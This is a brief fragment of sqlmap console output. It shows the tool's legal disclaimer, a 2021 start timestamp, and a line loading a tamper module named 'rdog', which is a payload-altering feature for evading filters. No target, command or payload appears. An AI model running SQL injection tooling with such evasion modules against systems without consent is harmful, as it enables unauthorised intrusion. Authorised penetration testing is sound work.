[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:28:14 /2021-07-27/

[17:28:16] [INFO] loading tamper module 'rdog'
```
